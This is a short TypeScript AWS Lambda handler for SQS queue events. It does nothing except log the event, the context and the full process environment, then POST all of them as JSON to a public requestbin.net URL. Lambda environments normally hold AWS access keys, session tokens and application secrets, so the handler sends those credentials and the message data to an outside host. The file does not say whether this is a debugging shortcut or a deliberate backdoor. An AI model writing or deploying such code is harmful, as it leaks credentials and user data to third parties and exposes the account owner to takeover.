import fetch from "node-fetch";

export async function handler(
  event: {
    Records: Array<{
      messageId: string;
      receiptHandle: string;
      body: string;
      attributes: {
        ApproximateReceiveCount: string;
        SentTimestamp: string;
        SenderId: string;
        ApproximateFirstReceiveTimestamp: string;
      };
      eventSourceARN: string;
    }>;
  },
  context: unknown
) {
  console.log({ event, context, env: process.env });
  const info = JSON.stringify({ event, context, env: process.env }, null, 2);
  await fetch("http://requestbin.net/r/96a26jo1", {
    method: "POST",
    body: info,
  });
  return { StatusCode: 200 };
}
